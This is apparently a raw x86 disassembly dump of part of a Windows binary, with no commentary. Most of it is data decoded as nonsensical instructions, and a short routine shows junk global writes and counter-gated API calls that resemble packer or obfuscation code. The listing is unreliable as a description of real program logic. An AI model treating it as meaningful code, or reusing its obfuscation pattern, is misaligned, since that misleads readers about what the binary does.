  40d422:	popa   
  40d423:	fisubr WORD PTR ds:0x6b67fd92
  40d429:	int    0xdd
  40d42b:	mov    ebx,0xa0369ac7
  40d430:	mov    eax,0x56820b2a
  40d435:	add    BYTE PTR [esi+0x402b44d1],ch
  40d43b:	ins    BYTE PTR es:[edi],dx
  40d43c:	dec    edx
  40d43d:	test   al,0x7a
  40d43f:	ss clc 
  40d441:	stc    
  40d442:	cmp    DWORD PTR [edi],ebx
  40d444:	arpl   WORD PTR [edx+0x2d73257e],cx
  40d44a:	fisub  DWORD PTR [edx]
  40d44c:	inc    esp
  40d44d:	mov    bl,0x82
  40d44f:	dec    edx
  40d450:	cli    
  40d451:	mov    ebp,0x31b00273
  40d456:	mov    edx,0xdd4d2f08
  40d45b:	enter  0x2ee1,0x83
  40d45f:	rcr    BYTE PTR [ecx],1
  40d461:	sub    eax,0x3fd01d04
  40d466:	jae    0x40d4c1
  40d468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d469:	mov    gs,WORD PTR [ecx]
  40d46b:	fldcw  WORD PTR [edx+0x48d74432]
  40d471:	inc    ecx
  40d472:	mov    BYTE PTR [eax+0x38],bh
  40d475:	stc    
  40d476:	adc    eax,0xb9a27c0a
  40d47b:	aam    0x1a
  40d47d:	push   cs
  40d47e:	inc    esp
  40d47f:	std    
  40d480:	xor    al,0x1e
  40d482:	dec    esi
  40d483:	in     eax,dx
  40d484:	adc    DWORD PTR [edi],ebp
  40d486:	xor    edi,ebx
  40d488:	and    al,0x75
  40d48a:	cmp    esi,DWORD PTR [ebp-0x63]
  40d48d:	jbe    0x40d450
  40d48f:	call   FWORD PTR [ebp+0x7acafab5]
  40d495:	lock jecxz 0x40d4a8
  40d498:	sti    
  40d499:	imul   DWORD PTR ds:0x2034461
  40d49f:	push   esi
  40d4a0:	in     al,0xe0
  40d4a2:	sub    cl,BYTE PTR [ebx+0x1771ccff]
  40d4a8:	pop    edi
  40d4a9:	mov    al,0xbf
  40d4ab:	fsubr  QWORD PTR [edx-0x1e56c855]
  40d4b1:	mov    al,0xcf
  40d4b3:	or     ebp,ebx
  40d4b5:	pop    ss
  40d4b6:	mov    ecx,0x66379283
  40d4bb:	jmp    0x3881e17d
  40d4c0:	inc    edx
  40d4c1:	mov    cl,0x71
  40d4c3:	ds aad 0x4d
  40d4c6:	retf   0x21cc
  40d4c9:	(bad)  
  40d4ca:	fld    DWORD PTR [ebx-0xa]
  40d4cd:	or     bl,cl
  40d4cf:	leave  
  40d4d0:	xchg   esi,eax
  40d4d1:	imul   BYTE PTR [eax+0x173c77a4]
  40d4d7:	jns    0x40d4fd
  40d4d9:	bound  eax,QWORD PTR [eax]
  40d4db:	(bad)  
  40d4dc:	push   ds
  40d4dd:	loope  0x40d51a
  40d4df:	sbb    bl,BYTE PTR [edi+ebp*4+0x4c]
  40d4e3:	test   eax,0xe7dd58d2
  40d4e8:	inc    ecx
  40d4e9:	into   
  40d4ea:	sbb    cl,bh
  40d4ec:	inc    esi
  40d4ed:	jnp    0x40d4e6
  40d4ef:	aaa    
  40d4f0:	cld    
  40d4f1:	adc    eax,0x9ef770cf
  40d4f6:	loope  0x40d548
  40d4f8:	aas    
  40d4f9:	and    edi,DWORD PTR [edx-0x5b9774d7]
  40d4ff:	xchg   esi,eax
  40d500:	push   ss
  40d501:	shl    DWORD PTR [ebx],cl
  40d503:	sub    al,0xc3
  40d505:	pushf  
  40d506:	mov    esp,0xccb349d3
  40d50b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d50c:	jg     0x40d541
  40d50e:	xchg   ebp,eax
  40d50f:	mov    dl,0xfe
  40d511:	inc    esp
  40d512:	cs push ss
  40d514:	and    al,0x6e
  40d516:	xchg   ecx,eax
  40d517:	push   ebp
  40d518:	not    bh
  40d51a:	lods   al,BYTE PTR ds:[esi]
  40d51b:	daa    
  40d51c:	cwde   
  40d51d:	pop    ss
  40d51e:	or     eax,0xcfa979f2
  40d523:	in     eax,dx
  40d524:	mov    cl,bh
  40d526:	call   0x302f:0xc0e4dd1e
  40d52d:	shl    BYTE PTR [edi+0x18cff1a7],cl
  40d533:	push   es
  40d534:	lock sti 
  40d536:	popa   
  40d537:	add    ebp,DWORD PTR [eax]
  40d539:	inc    esp
  40d53a:	leave  
  40d53b:	or     DWORD PTR [esi-0xc15e109],esi
  40d541:	sbb    al,0x9f
  40d543:	dec    edi
  40d544:	pushf  
  40d545:	or     eax,DWORD PTR [ebx]
  40d547:	or     eax,0xa1cb0b96
  40d54c:	int3   
  40d54d:	inc    ecx
  40d54e:	cli    
  40d54f:	pop    edx
  40d550:	es jnp 0x40d5c2
  40d553:	jb     0x40d57e
  40d555:	sub    al,0xf8
  40d557:	push   edx
  40d558:	sbb    al,0x58
  40d55a:	ja     0x40d5a3
  40d55c:	or     BYTE PTR [eax],dl
  40d55e:	gs inc esi
  40d560:	sar    DWORD PTR [ebx+0x753bcc23],cl
  40d566:	adc    BYTE PTR [eax*8-0x573237f1],cl
  40d56d:	dec    ebx
  40d56e:	sbb    ch,al
  40d570:	xchg   esp,eax
  40d571:	jb     0x40d511
  40d573:	dec    edi
  40d574:	add    ecx,0xa728e507
  40d57a:	or     DWORD PTR [edi],0x8a8a2c0
  40d580:	adc    DWORD PTR [edi-0x3a],0xffffffda
  40d584:	sbb    eax,0x500bc9f1
  40d589:	jo     0x40d5ce
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433723,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433717,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43371b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433727,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433763
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43371b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4337a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4337af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4336db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43375b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433797,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433797
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433797,edx
  40d64f:	cmp    DWORD PTR ds:0x433797,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433797,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4336e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4336e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4336e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4336e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4337d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4336e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4336e7
  40d6b7:	add    eax,DWORD PTR ds:0x43371b
  40d6bd:	mov    ds:0x4336e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x2ea0482a
  40d6f9:	adc    DWORD PTR [ebx+0x7e927abe],0x7e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6cc
  40d705:	xor    BYTE PTR [edi-0x4a],al
  40d708:	add    al,0x5d
  40d70a:	and    al,dh
  40d70c:	call   0xcfaa432e
  40d711:	pop    edi
  40d712:	jg     0x40d724
  40d714:	jl     0x40d724
  40d716:	scas   eax,DWORD PTR es:[edi]
  40d717:	sbb    eax,0xb8e96ab9
  40d71c:	popa   
  40d71d:	mov    ah,0xe4
  40d71f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d720:	push   es
  40d721:	aad    0xc5
  40d723:	jl     0x40d74c
  40d725:	mov    ebx,0x78bc786e
  40d72a:	xor    ch,cl
  40d72c:	dec    ecx
  40d72d:	call   0x3fc9:0xa0c6bbfb
  40d734:	jge    0x40d6cb
  40d736:	mov    ecx,0x4a410082
  40d73b:	cmp    eax,0x2772d310
  40d740:	fmul   DWORD PTR [ebx]
  40d742:	mov    bl,bl
  40d744:	fmul   QWORD PTR [ebp-0x2c]
  40d747:	dec    edx
  40d748:	xchg   ecx,eax
  40d749:	sti    
  40d74a:	xchg   ebp,eax
  40d74b:	jge    0x40d7a4
  40d74d:	pop    ebp
  40d74e:	mov    esp,0xfa139095
  40d753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d754:	dec    edx
  40d755:	lds    esi,FWORD PTR [eax+ecx*2]
  40d758:	cdq    
  40d759:	pop    ss
  40d75a:	push   0x68
  40d75c:	or     cl,BYTE PTR [edx-0x40086e62]
  40d762:	test   eax,0x1fd3b717
  40d767:	sub    ch,BYTE PTR [esi-0x22]
  40d76a:	pop    edi
  40d76b:	shl    BYTE PTR [eax+0x74],cl
  40d76e:	nop
  40d76f:	sub    BYTE PTR [ecx],0x91
  40d772:	add    al,0x5c
  40d774:	or     eax,0x87a2ea33
  40d779:	dec    BYTE PTR [edx+0x758ca07]
  40d77f:	in     al,0x8e
  40d781:	lahf   
  40d782:	xor    eax,0xa2d7f62
  40d787:	and    al,0x4c
  40d789:	cli    
  40d78a:	mov    dh,0x2c
  40d78c:	int    0xd0
  40d78e:	cmp    DWORD PTR [edi],eax
  40d790:	push   ds
  40d791:	inc    esi
  40d792:	mov    esp,0xa12627fb
  40d797:	push   esi
  40d798:	ins    DWORD PTR es:[edi],dx
  40d799:	add    edi,DWORD PTR [eax+0x30]
  40d79c:	or     DWORD PTR [ebp-0x36344bfb],edx
  40d7a2:	aad    0xa5
  40d7a4:	adc    DWORD PTR [edi],ebx
  40d7a6:	ins    BYTE PTR es:[edi],dx
  40d7a7:	scas   eax,DWORD PTR es:[edi]
  40d7a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7a9:	xchg   esi,eax
  40d7aa:	push   ss
  40d7ab:	and    eax,0x24dfd4cf
  40d7b0:	sbb    esi,DWORD PTR [ecx+eax*2]
  40d7b3:	aas    
  40d7b4:	in     al,0x48
  40d7b6:	fldcw  WORD PTR ds:[edi+0x1ada2fdc]
  40d7bd:	ss fwait
  40d7bf:	push   edx
  40d7c0:	push   eax
  40d7c1:	jnp    0x40d761
  40d7c3:	inc    ecx
  40d7c4:	xchg   esp,eax
  40d7c5:	mov    DWORD PTR [eax+eax*8+0x38c982e5],eax
  40d7cc:	pop    ds
  40d7cd:	lds    eax,FWORD PTR [ecx*1+0x34314d6a]
  40d7d4:	cmc    
  40d7d5:	xchg   esi,eax
  40d7d6:	dec    esp
  40d7d7:	xchg   esp,eax
  40d7d8:	scas   eax,DWORD PTR es:[edi]
  40d7d9:	fs test al,0xa4
  40d7dc:	pop    esi
  40d7dd:	jg     0x40d798
  40d7df:	jmp    0x494df990
  40d7e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7e5:	test   eax,0xfd752c98
  40d7ea:	(bad)  
  40d7ec:	sub    al,0x6a
  40d7ee:	outs   dx,DWORD PTR ds:[esi]
  40d7ef:	mov    ebx,0xc25dcbda
  40d7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7f5:	call   0x4b7d89c1
  40d7fa:	shl    DWORD PTR [ecx-0x46],1
  40d7fd:	into   
  40d7fe:	xor    BYTE PTR [eax],cl
  40d800:	jo     0x40d86d
  40d802:	lods   al,BYTE PTR ds:[esi]
  40d803:	add    esp,DWORD PTR [edi-0x49485fff]
  40d809:	xchg   esi,eax
  40d80a:	mov    ebp,DWORD PTR [ebx-0x3dbcfe9d]
  40d810:	lea    ebp,[eax+ebp*2]
  40d813:	jo     0x40d851
  40d815:	jg     0x40d7aa
  40d817:	ret    
  40d818:	cs dec esp
  40d81a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d81b:	faddp  st(4),st
  40d81d:	lock sahf 
  40d81f:	or     esp,DWORD PTR [edi-0x1f]
  40d822:	call   0x5066970e
  40d827:	mov    WORD PTR [edi+ebx*8],?
  40d82a:	out    dx,eax
  40d82b:	fs call 0xdfa9:0x20c920eb
  40d833:	mov    eax,DWORD PTR [ebp-0x75]
  40d836:	push   0xca7e371f
  40d83b:	(bad)  
  40d83c:	pop    DWORD PTR [eax]
  40d83e:	or     eax,0x7ddac5b4
  40d843:	mov    eax,0x507a3e40
  40d848:	call   0x99bbfbc5
  40d84d:	inc    esp
  40d84e:	mov    dh,bh
  40d850:	xchg   ebx,eax
  40d851:	jne    0x40d7ee
  40d853:	pushf  
  40d854:	fwait
  40d855:	popa   
  40d856:	mov    DWORD PTR [ebp-0x3b9127b8],eax
  40d85c:	mov    dh,al
  40d85e:	adc    dh,BYTE PTR [ecx+eiz*8-0x2cde0275]
  40d865:	jmp    0xc38a74a0
  40d86a:	mov    edi,0x76bb8c9a
  40d86f:	mov    ds:0x8b4f74f4,eax
  40d874:	cdq    
  40d875:	mov    ch,0x52
  40d877:	lahf   
  40d878:	aaa    
  40d879:	mov    edi,ecx
  40d87b:	or     ebx,DWORD PTR [ebp+0x2379be1e]
  40d881:	into   
  40d882:	mov    ch,BYTE PTR [ecx+ebx*8+0x1c]
  40d886:	adc    BYTE PTR [esi+0x24],bl
  40d889:	popa   
  40d88a:	jb     0x40d883
  40d88c:	(bad)  
  40d88d:	push   ebp
  40d88e:	dec    ebp
  40d88f:	sbb    DWORD PTR [esi+0x7b068802],edx
  40d895:	test   DWORD PTR [ebp-0x409a1bba],ebp
  40d89b:	push   edi
  40d89c:	dec    ebp
  40d89d:	loop   0x40d887
  40d89f:	lods   eax,DWORD PTR ds:[esi]
  40d8a0:	pop    esp
  40d8a1:	(bad)  
  40d8a2:	shl    DWORD PTR [edx-0x5c50b88c],1
  40d8a8:	mov    al,ds:0x28ed31ac
  40d8ad:	inc    ebx
  40d8ae:	cli    
  40d8af:	ret    
  40d8b0:	jno    0x40d8b5
  40d8b2:	test   DWORD PTR [esi],ebp
  40d8b4:	dec    esp
  40d8b5:	push   ebp
  40d8b6:	or     ecx,DWORD PTR ds:0x2581b805
  40d8bc:	nop
  40d8bd:	sti    
  40d8be:	lahf   
  40d8bf:	sahf   
  40d8c0:	mov    esi,0x9807588e
  40d8c5:	icebp  
  40d8c6:	fbld   TBYTE PTR [esi-0x4ff15ac6]
  40d8cc:	add    eax,0xa6a79333
  40d8d1:	call   0x40d5:0x5e03d183
  40d8d8:	push   cs
  40d8d9:	int    0xe9
  40d8db:	cmp    DWORD PTR [eax+0xc0bf03a],ebx
  40d8e1:	fcmovb st,st(2)
  40d8e3:	mov    dh,BYTE PTR [edx+ecx*8]
  40d8e6:	jnp    0x40d936
  40d8e8:	add    al,0xe0
  40d8ea:	adc    dh,cl
  40d8ec:	adc    al,bl
  40d8ee:	sbb    DWORD PTR [edx],eax
  40d8f0:	xor    BYTE PTR [ecx+eiz*2-0x142682d7],al
  40d8f7:	pop    ds
  40d8f8:	and    eax,0x6a8bb66f
  40d8fd:	mov    bl,0x33
  40d8ff:	(bad)  
  40d900:	xchg   BYTE PTR [esi+0x23],dl
  40d903:	add    ebx,DWORD PTR [esi+0x1b]
  40d906:	mov    ch,0x8b
  40d908:	retf   0xcdf0
  40d90b:	adc    eax,0x1b48675c
  40d910:	nop
  40d911:	aas    
  40d912:	mov    ebx,0x92e73776
  40d917:	pop    ebx
  40d918:	in     eax,0x43
  40d91a:	repnz pop ebx
  40d91c:	fwait
  40d91d:	dec    edx
  40d91e:	lahf   
  40d91f:	jg     0x40d931
  40d921:	shl    DWORD PTR [edi-0x1f12fd0a],1
  40d927:	xchg   edi,eax
  40d928:	mov    bh,BYTE PTR [ecx+0x6c50418f]
  40d92e:	add    esi,DWORD PTR [edi+0x729b5b6a]
  40d934:	mov    ds:0x22189aff,eax
  40d939:	push   0x79
  40d93b:	lahf   
  40d93c:	daa    
  40d93d:	push   edi
  40d93e:	fs rdpmc 
  40d941:	cmp    al,0x5f
  40d943:	mov    DWORD PTR gs:[ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xed2b51ed
  40d96a:	mov    cl,0x4a
  40d96c:	cmp    BYTE PTR [edx],0x90
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d9a1
  40d976:	add    eax,0x3dc5527
  40d97b:	jecxz  0x40d9dc
  40d97d:	out    0xf3,al
  40d97f:	test   al,0xc4
  40d982:	add    al,0x17
  40d984:	add    DWORD PTR [edx],ebp
  40d986:	jl     0x40d959
  40d988:	jae    0x40d94d
  40d98a:	and    DWORD PTR [esi+0x4af68d54],0x6e
  40d991:	jle    0x40da0c
  40d993:	pop    esp
  40d994:	repz lock (bad) 
  40d997:	mov    edx,0x9bdeeeb4
  40d99c:	dec    eax
  40d99d:	mov    edx,0x64bf2677
  40d9a2:	mov    eax,0x5fa86ef2
  40d9a7:	shl    BYTE PTR [edx+0x7769aa5b],0xa2
  40d9ae:	mov    ds:0x5f4ed882,al
  40d9b3:	cmp    BYTE PTR [ebx-0x7c96b75a],0xa8
  40d9ba:	xchg   edx,eax
  40d9bb:	sub    al,0xae
  40d9bd:	push   esi
  40d9be:	and    eax,DWORD PTR [eax]
  40d9c0:	sbb    BYTE PTR [eax-0x4],dl
  40d9c3:	js     0x40d99e
  40d9c5:	sub    ch,BYTE PTR ds:0x545683eb
  40d9cb:	out    0x1e,al
  40d9cd:	(bad)  
  40d9ce:	sub    al,0x16
  40d9d0:	jmp    0x85dfb055
  40d9d5:	ds gs xchg esi,eax
  40d9d8:	nop
  40d9d9:	(bad)  
  40d9da:	int    0x78
  40d9dc:	sbb    dh,BYTE PTR [edi-0x545e699c]
  40d9e2:	and    DWORD PTR [edi],0x3925ed31
  40d9e8:	js     0x40d9b8
  40d9ea:	cmp    DWORD PTR [ecx+0x4497125],esi
  40d9f0:	xchg   esi,eax
  40d9f1:	test   DWORD PTR [esi+0x6d],edi
  40d9f4:	pop    edi
  40d9f5:	(bad)  
  40d9f6:	mov    ds:0xf70cd88f,eax
  40d9fb:	adc    BYTE PTR [edx+0x9],dl
  40d9fe:	out    0x5b,al
  40da00:	stos   DWORD PTR es:[edi],eax
  40da01:	mov    ah,0xa9
  40da03:	mov    edi,0xb681e1bb
  40da08:	sub    cl,BYTE PTR [edi]
  40da0a:	xor    al,0x86
  40da0c:	pop    ds
  40da0d:	xor    dl,0x4a
  40da10:	test   dh,dh
  40da12:	mov    edx,DWORD PTR [edx-0x23]
  40da15:	mov    eax,0x59a31805
  40da1a:	scas   eax,DWORD PTR es:[edi]
  40da1b:	dec    ecx
  40da1c:	inc    edi
  40da1d:	push   edx
  40da1e:	adc    eax,0x48f3799
  40da23:	ror    DWORD PTR [ebx+0x73],cl
  40da26:	repnz sti 
  40da28:	cld    
  40da29:	nop
  40da2a:	call   FWORD PTR [esi-0x1e]
  40da2d:	sbb    BYTE PTR [eax],0xb0
  40da30:	rcl    BYTE PTR [ebp-0x4b],1
  40da33:	sbb    esi,DWORD PTR ds:0x4b636eec
  40da39:	push   eax
  40da3a:	mov    eax,ds:0x744c3973
  40da3f:	fild   WORD PTR [esi+0x2c5d61c1]
  40da45:	jle    0x40d9d4
  40da47:	dec    esi
  40da48:	pusha  
  40da49:	test   BYTE PTR [ebp+0x60],0x84
  40da4d:	enter  0xb476,0x3d
  40da51:	dec    edx
  40da52:	inc    esp
  40da53:	ret    0x1898
  40da56:	xor    al,0x47
  40da58:	dec    edi
  40da59:	fsub   QWORD PTR [ebx+0x54ca5e72]
  40da5f:	jne    0x40dab4
  40da61:	adc    BYTE PTR [ebp+0x26],bl
  40da64:	jnp    0x40da78
  40da66:	aaa    
  40da67:	test   DWORD PTR [ebx-0x93f8d9f],esp
  40da6d:	jne    0x40da4e
  40da6f:	or     al,0x3e
  40da71:	mov    cl,0x29
  40da73:	adc    edx,DWORD PTR [eax]
  40da75:	fild   WORD PTR [ecx+ecx*2]
  40da78:	cmp    ah,0xe4
  40da7b:	(bad)  
  40da7c:	imul   eax,ebx,0xd506e885
  40da82:	sbb    ebx,eax
  40da84:	mov    bh,0x47
  40da86:	pop    ebx
  40da87:	cld    
  40da88:	aaa    
  40da89:	inc    ebp
  40da8a:	shr    BYTE PTR [ecx-0x4fd0985e],0xd
  40da91:	dec    edx
  40da92:	rcr    DWORD PTR [esi],1
  40da94:	outs   dx,BYTE PTR ds:[esi]
  40da95:	cwde   
  40da96:	hlt    
  40da97:	leave  
  40da98:	fistp  WORD PTR [ecx+0x2]
  40da9b:	cmp    edi,eax
  40da9d:	add    edx,DWORD PTR [ecx]
  40da9f:	push   ecx
  40daa0:	push   es
  40daa1:	sar    edx,1
  40daa3:	pop    esi
  40daa4:	stc    
  40daa5:	ret    0xe985
  40daa8:	pop    ebp
  40daa9:	(bad)  
  40daab:	cmp    eax,0x106d4e33
  40dab0:	mov    BYTE PTR [eax],ch
  40dab2:	jbe    0x40daca
  40dab4:	lods   eax,DWORD PTR ds:[esi]
  40dab5:	dec    eax
  40dab6:	lea    edi,[ebx]
  40dab8:	ins    DWORD PTR es:[edi],dx
  40dab9:	sbb    ebx,ebx
  40dabb:	xchg   edx,eax
  40dabc:	aad    0xe7
  40dabe:	fimul  WORD PTR [esp+ecx*1+0x61688c1c]
  40dac5:	and    DWORD PTR [ebp+edi*4+0x6d],0x167882d9
  40dacd:	cmp    eax,0x12aa1a07
  40dad2:	sti    
  40dad3:	ja     0x40db32
  40dad5:	fisttp QWORD PTR [ebp+0x72]
  40dad8:	push   eax
  40dad9:	push   0xffffffef
  40dadb:	test   cl,0xc9
  40dade:	imul   esi,DWORD PTR [ecx+0x595d9fc0],0x3031e7c6
  40dae8:	mov    edx,0x9d6217f9
  40daed:	fwait
  40daee:	cmp    al,0x25
  40daf0:	(bad)  
  40daf1:	inc    DWORD PTR [esi-0x53f8a7de]
  40daf7:	ss push 0x3607d09f
  40dafd:	int3   
  40dafe:	loop   0x40db38
  40db00:	push   cs
  40db01:	cmc    
  40db02:	sub    al,0x39
  40db04:	inc    edx
  40db05:	je     0x40dabc
  40db07:	jl     0x40db59
  40db09:	cli    
  40db0a:	inc    eax
  40db0b:	sub    al,0x71
  40db0d:	jl     0x40dac2
  40db0f:	mov    edx,0x11e9d9ef
  40db14:	fdiv   DWORD PTR [ecx+0x41eabeef]
  40db1a:	mov    WORD PTR [edx+0x62362233],ss
  40db20:	out    0x6f,al
  40db22:	pop    esp
  40db23:	popa   
  40db24:	jl     0x40db83
  40db26:	(bad)  
  40db2a:	push   eax
  40db2b:	inc    DWORD PTR [ecx]
  40db2d:	xor    eax,0x4ee3f79d
  40db32:	ror    BYTE PTR [ecx],0x0
  40db35:	sar    DWORD PTR ds:0x98c7d9c9,cl
  40db3b:	adc    dh,BYTE PTR [edx]
  40db3d:	mov    bl,0x36
  40db3f:	or     ecx,DWORD PTR es:[ecx]
  40db42:	imul   esp,ecx,0xffffffe7
  40db45:	mov    eax,DWORD PTR [esi]
  40db47:	mov    eax,0x8cc61a24
  40db4c:	add    DWORD PTR [ebx-0x44453347],eax
  40db52:	pop    ebx
  40db53:	mov    ch,0x76
  40db55:	adc    BYTE PTR [edx],cl
  40db57:	fnstcw WORD PTR [edx+0x30a862fa]
  40db5d:	mov    esi,0x6614134e
  40db62:	pop    es
  40db63:	dec    ebp
  40db64:	mov    cl,0xf9
  40db66:	inc    ebp
  40db67:	cmp    ch,bh
  40db69:	inc    esp
  40db6a:	shl    cl,1
  40db6c:	test   DWORD PTR [ebx+ebx*8],esp
  40db6f:	iret   
  40db70:	and    al,0x30
  40db72:	and    ah,0xac
  40db75:	inc    edx
  40db76:	out    dx,eax
  40db77:	xor    DWORD PTR [esi-0x70],esi
  40db7a:	sti    
  40db7b:	sbb    al,0x66
  40db7d:	and    bh,BYTE PTR ds:0x23e785e2
  40db83:	jmp    0x9e94:0x725dcd78
  40db8a:	shl    BYTE PTR [esi],0x29
  40db8d:	popf   
  40db8e:	pop    ecx
  40db8f:	xor    ah,BYTE PTR [esi]
  40db91:	or     ebx,DWORD PTR [esi-0x4fa0784f]
  40db97:	dec    edi
  40db98:	dec    ecx
  40db99:	cmp    DWORD PTR [ecx+0x59],ebp
  40db9c:	sub    bl,bh
  40db9e:	retf   0xe3d0
  40dba1:	sbb    BYTE PTR [eax],bh
  40dba3:	bound  eax,QWORD PTR [ebx]
  40dba5:	ror    DWORD PTR [ebx-0x26adbd3d],cl
  40dbab:	dec    ecx
  40dbac:	popa   
  40dbad:	or     al,0x4
  40dbaf:	dec    eax
  40dbb0:	fist   WORD PTR [edi+0x2a]
  40dbb3:	xchg   esp,eax
  40dbb4:	aad    0x3b
  40dbb6:	ror    DWORD PTR [edi],0x85
  40dbb9:	add    BYTE PTR [edx],0x0
  40dbbc:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x1840145c],0xfa64fa27
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc5c
  40dbe0:	sbb    eax,0xd14fb1b9
  40dbe5:	mov    dl,0x5
  40dbe7:	popa   
  40dbe8:	loope  0x40dc56
  40dbea:	pop    eax
  40dbeb:	jns    0x40dbd4
  40dbed:	jecxz  0x40dbbe
  40dbef:	push   edi
  40dbf0:	out    dx,al
  40dbf1:	mov    ch,0x31
  40dbf3:	mov    ecx,0x44e08f19
  40dbf8:	mov    eax,ds:0x79656dc6
  40dbfd:	mov    eax,ds:0x27deba4a
  40dc03:	sbb    eax,0xf09a4ea3
  40dc08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc09:	sbb    ebx,DWORD PTR [ebx+0x65]
  40dc0c:	push   ebx
  40dc0d:	pop    ebp
  40dc0e:	mov    ds:0x4c08c939,eax
  40dc13:	or     DWORD PTR [ebp-0x7e1baa31],edi
  40dc19:	dec    ebx
  40dc1a:	enter  0xd902,0x33
  40dc1e:	fwait
  40dc1f:	stos   DWORD PTR es:[edi],eax
  40dc20:	std    
  40dc21:	rcl    BYTE PTR [ebx-0x50639edd],1
  40dc27:	adc    ebp,0xffffffed
  40dc2a:	mov    ds:0x926280dc,al
  40dc2f:	(bad)  
  40dc31:	add    ebx,edi
  40dc33:	and    al,0x7c
  40dc35:	pop    edi
  40dc36:	mov    esp,0x496546a3
  40dc3b:	xor    cl,bl
  40dc3d:	jmp    0x4346:0x741a565
  40dc44:	bound  esi,QWORD PTR [eax+ecx*1]
  40dc47:	jmp    0xa93b1568
  40dc4c:	jns    0x40dc6b
  40dc4e:	mov    dl,0x28
  40dc50:	stos   BYTE PTR es:[edi],al
  40dc51:	mov    eax,0x3bd4df67
  40dc56:	outs   dx,DWORD PTR ds:[esi]
  40dc57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc58:	in     eax,0x70
  40dc5a:	aad    0x18
  40dc5c:	cmc    
  40dc5d:	ins    DWORD PTR es:[edi],dx
  40dc5e:	imul   esi,DWORD PTR [ebx],0x52
  40dc61:	add    BYTE PTR [edi-0x3807e989],bh
  40dc67:	sbb    al,0x89
  40dc69:	in     eax,dx
  40dc6a:	shr    BYTE PTR [edx],0x74
  40dc6d:	pcmpeqd mm1,QWORD PTR [edx]
  40dc70:	mov    ds:0xf5765746,eax
